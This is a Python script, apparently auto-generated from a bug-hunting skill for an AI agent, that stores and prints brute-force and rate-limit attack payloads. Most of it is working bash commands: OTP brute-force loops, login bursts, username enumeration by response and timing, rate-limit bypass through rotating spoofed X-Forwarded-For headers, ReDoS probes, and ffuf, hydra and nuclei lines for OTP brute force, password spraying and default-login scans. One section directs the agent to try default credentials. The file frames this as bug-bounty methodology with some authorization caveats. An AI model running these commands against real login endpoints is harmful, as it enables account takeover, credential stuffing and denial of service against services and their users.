#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-brute-force

Skill: HUNT-BRUTE-FORCE — Rate Limiting / Brute Force / Enumeration
Desc : Hunt Missing/Weak Rate Limiting — login brute force, OTP/2FA brute force (10^6 keyspace), password-reset-token brute, credential stuffing, username/email enumeration via error-string / status-code / timing differences, weak password policy, missing CAPTCHA (CAPTCHA token replay / single-use / concurrency-window bypass specifics → hunt-captcha-bypass), IP-based rate-limit bypass via X-Forwarded-For and friends, ReDoS. Distinguishes hard lockout vs soft IP-throttle vs CAPTCHA-injection vs silent shadow-throttling (avoids false-negative 'no rate limit' conclusions). Medium to Critical depending on what the brute reaches (OTP→ATO = Critical).

Run:  python claude-bughunter-hunt-brute-force.py --help
      python claude-bughunter-hunt-brute-force.py --list
      python claude-bughunter-hunt-brute-force.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-brute-force'
TITLE = 'HUNT-BRUTE-FORCE — Rate Limiting / Brute Force / Enumeration'
DESCRIPTION = "Hunt Missing/Weak Rate Limiting — login brute force, OTP/2FA brute force (10^6 keyspace), password-reset-token brute, credential stuffing, username/email enumeration via error-string / status-code / timing differences, weak password policy, missing CAPTCHA (CAPTCHA token replay / single-use / concurrency-window bypass specifics → hunt-captcha-bypass), IP-based rate-limit bypass via X-Forwarded-For and friends, ReDoS. Distinguishes hard lockout vs soft IP-throttle vs CAPTCHA-injection vs silent shadow-throttling (avoids false-negative 'no rate limit' conclusions). Medium to Critical depending on what the brute reaches (OTP→ATO = Critical)."

PAYLOADS = {
    'main': ["name: hunt-brute-force", "description: \"Hunt Missing/Weak Rate Limiting \u2014 login brute force, OTP/2FA brute force (10^6 keyspace), password-reset-token brute, credential stuffing, username/email enumeration via error-string / status-code / timing differences, weak password policy, missing CAPTCHA (CAPTCHA token replay / single-use / concurrency-window bypass specifics \u2192 hunt-captcha-bypass), IP-based rate-limit bypass via X-Forwarded-For and friends, ReDoS. Distinguishes hard lockout vs soft IP-throttle vs CAPTCHA-injection vs silent shadow-throttling (avoids false-negative 'no rate limit' conclusions). Medium to Critical depending on what the brute reaches (OTP\u2192ATO = Critical).\"", "sources: public_research", "report_count: 0"],
    'hunt-brute-force-rate-limiting-brute-force-enumeration': [],
    'crown-jewel-targets': ["OTP brute force (6-digit = 1,000,000 combinations) with no effective rate limit = Critical ATO bypass.", "**Highest-value chains:**", "- **OTP / 2FA brute \u2192 MFA bypass \u2192 ATO** \u2014 no effective rate limit on `/verify-otp`, full 000000\u2013999999 keyspace reachable", "- **Password-reset token brute** \u2014 short/predictable/non-expiring tokens + no rate limit \u2192 ATO (the Instagram 2019 case combined a 6-digit reset code, no rate limit per request-source, and IP rotation to make 10^6 tractable)", "- **Username/email enumeration \u2192 targeted credential stuffing** \u2014 valid/invalid distinguishable by response string, status code, or timing, then sprayed with breach corpora", "- **Coupon / gift-card / referral code brute** \u2014 no rate limit on code validation \u2192 financial impact", "- **ReDoS** \u2014 attacker-controlled input hits a catastrophic-backtracking regex \u2192 CPU exhaustion \u2192 DoS"],
    'autonomous-testing-priority': ["**Work within your turn budget \u2014 prioritize signal over volume.**", "You cannot brute-force millions of combinations in automated testing. Focus on two things: (1) credential spraying with the most likely candidates, and (2) detecting whether rate limiting exists at all.", "**Strategy:**", "1. Identify the login endpoint and the expected parameter names (username/email, password).", "2. Try weak/default credentials likely for the target context \u2014 default admin credentials for the app's stack, simple passwords for test environments, credentials visible elsewhere on the app (e.g. usernames exposed in profiles, default passwords in documentation).", "3. After 3-5 failed attempts, check for rate-limit signals (429 status, \"too many attempts\" message, CAPTCHA appearance, account lockout message). Absence of these = rate limiting is missing = vulnerability.", "4. Use form-encoding for traditional login forms, JSON for REST API login endpoints.", "**What to look for as success:**", "- Session token or JWT in the response body or Set-Cookie header", "- Redirect to authenticated dashboard", "- Response body that differs from the failed-login baseline", "**Username enumeration (separate finding):** Try a known-valid username vs a random one. If the error message differs (\"Wrong password\" vs \"User not found\") or response time differs \u2192 user enumeration vulnerability, even without a successful login."],
    'critical-four-rate-limit-states-do-not-collapse-them': ["A `200`/`401` with no `429` does **not** mean \"no rate limiting\". A rate-limiting", "skill that only checks for `429`/lockout produces false negatives. Classify the", "defense BEFORE concluding, by sending a burst of ~50 requests and watching the", "*full* response (status, body, headers, latency, and downstream success):", "**Shadow-throttle detector** \u2014 inject a known-good value at a known position and", "confirm it still works under load:", "```bash"],
    'seed-position-500-in-the-brute-set-is-the-real-otp-for-your-own-test-account': [],
    'if-the-loop-reaches-500-and-the-correct-code-no-longer-authenticates': [],
    'the-endpoint-is-silently-throttling-dropping-not-unprotected': ["KNOWN_GOOD=\"123456\"   # the actual current OTP for YOUR test account", "for n in $(seq 0 600); do", "CODE=$([ \"$n\" = \"500\" ] && echo \"$KNOWN_GOOD\" || printf \"%06d\" \"$n\")", "CODE_RESP=$(curl -s -o /tmp/bf_body -w \"%{http_code} %{time_total}\" \\", "-X POST \"https://$TARGET/api/verify-otp\" \\", "-H \"Content-Type: application/json\" -H \"Cookie: $SESSION_COOKIE\" \\", "-d \"{\\\"otp\\\":\\\"$CODE\\\"}\")", "echo \"$n $CODE $CODE_RESP $(wc -c </tmp/bf_body)\""],
    'three-columns-to-watch-status-time-total-body-size': [],
    'rising-time-total-or-a-body-size-change-with-status-unchanged-shadow-throttle': [],
    'step-by-step-hunting-methodology': [],
    'phase-1-login-rate-limit-test-classify-don-t-just-count-429s': ["```bash"],
    'send-a-burst-and-log-status-latency-body-length-for-each-attempt': ["for i in $(seq 1 50); do", "read CODE TIME < <(curl -s -o /tmp/bf_l -w \"%{http_code} %{time_total}\\n\" \\", "-X POST \"https://$TARGET/api/login\" \\", "-H \"Content-Type: application/json\" \\", "-d \"{\\\"username\\\":\\\"test@$TARGET\\\",\\\"password\\\":\\\"wrong$i\\\"}\")", "echo \"Attempt $i: status=$CODE time=${TIME}s len=$(wc -c </tmp/bf_l)\"", "sleep 0.1"],
    'then-classify-against-the-4-state-table-above-watch-for': [],
    'status-flips-to-429-403-soft-throttle-or-lockout': [],
    'body-grows-captcha-token-appears-captcha-injection': [],
    'latency-climbs-while-status-stays-401-shadow-throttle': [],
    'genuinely-nothing-changes-across-all-50-candidate-no-rate-limit-confirm-w-phase-2-seed': [],
    'phase-2-otp-2fa-brute-force': ["```bash"],
    'pre-requisite-a-valid-session-that-is-pending-otp-verification-your-own-test-account': ["SESSION_COOKIE=\"pre-auth-session-after-first-factor\""],
    '2a-poc-probe-send-101-codes-seq-0-100-is-inclusive-101-values': [],
    'this-only-proves-the-endpoint-accepts-repeated-attempts-without-429-lockout': [],
    'it-does-not-prove-the-full-10-6-keyspace-is-brute-forcible-see-2b': ["for CODE in $(seq -f \"%06g\" 0 100); do", "RESP=$(curl -s -X POST \"https://$TARGET/api/verify-otp\" \\", "-H \"Content-Type: application/json\" -H \"Cookie: $SESSION_COOKIE\" \\", "-d \"{\\\"otp\\\":\\\"$CODE\\\"}\" -o /dev/null -w \"%{http_code}\")", "echo \"$CODE: $RESP\"", "[ \"$RESP\" = \"429\" ] && { echo \"Rate limit at $CODE\"; break; }"],
    '101-attempts-with-no-429-lockout-endpoint-is-a-candidate-now-run-the-shadow-throttle': [],
    'seed-test-above-before-claiming-no-rate-limit-a-clean-probe-is-necessary-not-sufficient': [],
    '2b-full-keyspace-impact-proof-only-with-explicit-authorization-your-own-account': [],
    'severity-rests-on-10-6-being-reachable-not-on-101-codes-demonstrate-tractability': [],
    'keyspace-10-6-observed-throughput-from-2a-req-s-expected-hit-at-half-keyspace': [],
    'e-g-50-req-s-sustained-10-6-50-5-5-hours-worst-case-2-8h-expected-that-is-the-impact': [],
    'if-a-code-rotates-every-t-seconds-the-real-bound-is-req-s-t-attempts-per-window': [],
    'brute-is-only-viable-if-throughput-code-lifetime-approaches-the-keyspace-or-if-the': [],
    'code-does-not-rotate-reset-is-unlimited-the-instagram-2019-class': [],
    'report-the-math-do-not-actually-exhaust-10-6-against-a-third-party': [],
    'phase-3-username-email-enumeration-string-and-status-and-timing': ["```bash", "VALID_USER=\"known-user@$TARGET\"", "INVALID_USER=\"definitely-not-real-xyz123@$TARGET\""],
    'string-status-diff': ["for U in \"$VALID_USER\" \"$INVALID_USER\"; do", "curl -s -o /tmp/bf_e -w \"[$U] status=%{http_code} time=%{time_total}s len=%{size_download}\\n\" \\", "-X POST \"https://$TARGET/api/login\" -H \"Content-Type: application/json\" \\", "-d \"{\\\"email\\\":\\\"$U\\\",\\\"password\\\":\\\"wrongpassword\\\"}\"", "diff <(curl -s -X POST \"https://$TARGET/api/login\" -H 'Content-Type: application/json' \\", "-d \"{\\\"email\\\":\\\"$VALID_USER\\\",\\\"password\\\":\\\"wrong\\\"}\") \\", "<(curl -s -X POST \"https://$TARGET/api/login\" -H 'Content-Type: application/json' \\", "-d \"{\\\"email\\\":\\\"$INVALID_USER\\\",\\\"password\\\":\\\"wrong\\\"}\")"],
    'different-message-status-len-enumeration': [],
    'timing-oracle-valid-users-hash-the-password-invalid-users-short-circuit-measurable-delta': [],
    'sample-many-times-and-compare-medians-a-single-request-is-noise-not-signal': ["echo \"VALID timings:\";   for i in $(seq 1 30); do curl -s -o /dev/null -w \"%{time_total}\\n\" \\", "-X POST \"https://$TARGET/api/login\" -H 'Content-Type: application/json' \\", "-d \"{\\\"email\\\":\\\"$VALID_USER\\\",\\\"password\\\":\\\"wrong\\\"}\"; done | sort -n | awk '{a[NR]=$1}END{print a[int(NR/2)]}'", "echo \"INVALID timings:\"; for i in $(seq 1 30); do curl -s -o /dev/null -w \"%{time_total}\\n\" \\", "-X POST \"https://$TARGET/api/login\" -H 'Content-Type: application/json' \\", "-d \"{\\\"email\\\":\\\"$INVALID_USER\\\",\\\"password\\\":\\\"wrong\\\"}\"; done | sort -n | awk '{a[NR]=$1}END{print a[int(NR/2)]}'"],
    'a-reproducible-median-delta-e-g-valid-180ms-vs-invalid-40ms-is-a-timing-based-enum-finding': [],
    'reset-registration-enumeration': ["curl -s -X POST \"https://$TARGET/forgot-password\" -d \"email=$VALID_USER\"   | grep -i \"sent\\|exist\\|not found\\|registered\"", "curl -s -X POST \"https://$TARGET/forgot-password\" -d \"email=$INVALID_USER\" | grep -i \"sent\\|exist\\|not found\\|registered\"", "curl -s -X POST \"https://$TARGET/api/register\"   -d \"email=$VALID_USER\"    | grep -i \"exist\\|taken\\|already\""],
    'phase-4-ip-source-rotation-bypass': ["```bash"],
    'per-ip-limits-are-bypassable-when-the-app-trusts-a-client-controlled-source-header': [],
    'rotate-the-header-every-request-if-the-429-you-hit-in-phase-1-disappears-broken-limit': ["HEADERS=( \"X-Forwarded-For\" \"X-Real-IP\" \"X-Originating-IP\" \"X-Client-IP\" \\", "\"X-Remote-IP\" \"X-Forwarded\" \"Forwarded-For\" \"CF-Connecting-IP\" \"True-Client-IP\" )", "for i in $(seq 1 60); do", "RAND_IP=\"$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1)\"", "ARGS=(); for h in \"${HEADERS[@]}\"; do ARGS+=(-H \"$h: $RAND_IP\"); done", "RESP=$(curl -s \"${ARGS[@]}\" -X POST \"https://$TARGET/api/login\" \\", "-H \"Content-Type: application/json\" \\", "-d \"{\\\"email\\\":\\\"test@$TARGET\\\",\\\"password\\\":\\\"wrong$i\\\"}\" -o /dev/null -w \"%{http_code}\")", "echo \"Attempt $i (IP $RAND_IP): $RESP\""],
    'also-try-multiple-comma-joined-xff-values-1-2-3-4-5-6-7-8-and-appending-your-real-ip': [],
    'after-a-spoofed-one-some-parsers-take-first-some-last': [],
    'confirm-the-bypass-re-run-phase-1-without-rotation-to-show-the-429-returns-the-delta-is-the-proof': [],
    'phase-5-token-entropy-measure-it-don-t-eyeball-it': ["```bash"],
    'collect-reset-session-otp-tokens-for-your-own-test-account-then-quantify-entropy': ["for i in $(seq 1 20); do", "curl -s -X POST \"https://$TARGET/forgot-password\" -d \"email=your-test@email.com\"", "sleep 2"],
    '1-shannon-entropy-compressibility-low-entropy-predictable': ["ent tokens.txt 2>/dev/null || \\", "python3 -c \"import sys,math,collections;d=open('tokens.txt').read();c=collections.Counter(d);n=len(d);\\", "print('bits/char =', -sum(v/n*math.log2(v/n) for v in c.values()))\""],
    '2-if-tokens-are-hex-base64-decode-and-look-for-structure-timestamp-counter-pid': ["while read t; do echo -n \"$t -> \"; echo -n \"$t\" | xxd -r -p 2>/dev/null | xxd | head -1; done < tokens.txt"],
    '3-sequential-time-correlated-test-sort-and-diff-consecutive-numeric-tokens': ["sort -n tokens.txt | awk 'NR>1{print $1-prev} {prev=$1}'   # constant/small delta = counter-based"],
    '4-definitive-tool-pipe-10k-tokens-through-burp-sequencer-live-capture-on-the-reset': [],
    'response-it-runs-fips-nist-randomness-tests-and-reports-effective-bits-of-entropy': [],
    '64-effective-bits-on-a-security-token-is-a-finding-the-brute-window-math-follows': [],
    'phase-6-redos-detection': ["```bash"],
    'hit-input-validation-search-endpoints-with-catastrophic-backtracking-payloads': [],
    'classic-evil-regex-triggers-nested-quantifier-overlapping-alternation': ["for LEN in 5 10 15 20 25 30; do", "INPUT=$(python3 -c \"print('a'*$LEN + '!')\")              # for (a+)+$  /  (a|a)*$ style regex", "T=$(curl -s -o /dev/null -w \"%{time_total}\" \"https://$TARGET/search?q=$INPUT\")", "echo \"len=$LEN -> ${T}s\""],
    'other-payload-shapes-to-try-by-field-email-regex-a-a-n-url-regex-http-a-n': [],
    'doubling-latency-per-5-chars-super-linear-redos-linear-growth-just-a-slow-endpoint-not-a-bug': [],
    'confirm-with-a-control-send-the-same-byte-length-of-a-benign-string-if-it-returns-fast-the': [],
    'blow-up-is-regex-driven-not-size-driven': [],
    'automation': ["```bash"],
    'ffuf-otp-brute': [],
    'poc-probe-101-codes-proves-acceptance-not-full-keyspace-note-the-inclusive-seq': ["ffuf -u \"https://$TARGET/api/verify-otp\" -X POST \\", "-H \"Content-Type: application/json\" -H \"Cookie: session=SESSION\" \\", "-d '{\"otp\": \"FUZZ\"}' \\", "-w <(seq -f \"%06g\" 0 100) \\", "-mc all -ac \\", "-rate 50            # cap throughput so YOU can read the rate-limit response, not DoS the target"],
    'full-keyspace-authorized-your-own-account-only-generate-all-10-6-codes': [],
    'seq-f-06g-0-999999-tmp-otp-full-txt-then-w-tmp-otp-full-txt': [],
    'use-mc-all-ac-so-ffuf-auto-calibrates-and-you-see-429-403-captcha-responses-instead-of': [],
    'filtering-them-out-mc-200-alone-hides-throttling-never-brute-with-mc-200-only': [],
    'add-p-0-1-jitter-and-watch-the-errors-ratelimited-counters-stop-if-the-success-oracle-stops-firing': [],
    'hydra-login-spray': ["hydra -l admin@target.com -P ~/wordlists/top-1000.txt \"$TARGET\" \\", "http-post-form \"/api/login:email=^USER^&password=^PASS^:Invalid\" -t 4"],
    'nuclei-rate-limit-default-cred-templates': ["nuclei -u \"https://$TARGET\" -t http/fuzzing/ -t http/default-logins/ -severity medium,high,critical"],
    'chain-table': [],
    'validation-false-positive-discipline': ["Before writing the report, each must hold:", "- **OTP/login \"no rate limit\"**: confirmed against ALL FOUR states \u2014 not just absence of `429`.", "Shadow-throttle seed test passed (the known-good value still authenticates under burst load).", "Latency and body-size were monitored, not only status code.", "- **Full-keyspace claim**: severity is justified by the *reachability math* (throughput \u00d7 code-lifetime", "vs 10^6), not by a 101-code probe. State the numbers in the report.", "- **Enumeration**: difference is reproducible across \u226520 samples and is a *server-state* difference", "(valid vs invalid user), not a server-policy artifact (e.g. a generic \"if this email exists we sent\u2026\"", "message is NOT enumeration). For timing, compare medians of many samples, never single requests.", "- **IP-rotation bypass**: proven by toggling rotation off and showing the `429` returns. The delta IS", "the proof; one fast run alone is not.", "- **Token entropy**: backed by an actual measurement (Burp Sequencer effective-bits, `ent`, or a", "demonstrated counter/timestamp structure), not \"looks short\".", "- **ReDoS**: super-linear (doubling) latency growth with a benign-control comparison; linear \u2260 ReDoS.", "- **Scope/impact**: did you reach a real outcome (authenticated session, leaked account list, DoS)?", "A rate-limit gap with no reachable impact is informational, not Medium.", "**Severity:**", "- Effective brute of OTP/MFA/reset-code \u2192 demonstrated ATO path: **Critical**", "- No login rate limit + working credential-stuffing/IP-bypass: **High**", "- Predictable security token (measured low entropy): **High**", "- Username/email enumeration alone: **Low\u2013Medium**", "- ReDoS with reproducible meaningful server lag: **Medium\u2013High**", "- Attacker-triggerable hard lockout (account DoS): **Medium**"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()